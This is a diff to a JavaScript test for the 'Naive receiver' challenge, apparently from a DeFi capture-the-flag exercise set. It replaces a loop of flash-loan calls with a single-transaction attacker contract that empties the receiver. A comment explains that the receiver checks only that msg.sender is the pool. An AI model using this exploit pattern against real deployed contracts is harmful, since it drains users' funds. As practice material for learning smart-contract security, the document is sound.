@@ -3,6 +3,7 @@ const { accounts, contract, web3 } = require("@openzeppelin/test-environment");
 
 const LenderPool = contract.fromArtifact("NaiveReceiverLenderPool");
 const FlashLoanReceiver = contract.fromArtifact("FlashLoanReceiver");
+const NaiveReceiverAttacker = contract.fromArtifact('NaiveReceiverAttacker');
 
 const { expect } = require("chai");
 
@@ -48,9 +49,13 @@ describe("[Challenge] Naive receiver", function () {
   it("Exploit", async function () {
     // can get a flash loan on receiver's behalf because they check msg.sender == pool
     // which is always true because the loan comes from the pool smart contract
-    while ((await balance.current(this.receiver.address)).gte(ether("1"))) {
-      await this.pool.flashLoan(this.receiver.address, ETHER_IN_RECEIVER);
-    }
+    // while ((await balance.current(this.receiver.address)).gte(ether("1"))) {
+    //   await this.pool.flashLoan(this.receiver.address, ETHER_IN_POOL);
+    // }
+
+    // single tx
+    this.attacker = await NaiveReceiverAttacker.new({ from: attacker });
+    await this.attacker.emptyReceiver(this.pool.address, this.receiver.address)
   });
 
   after(async function () {
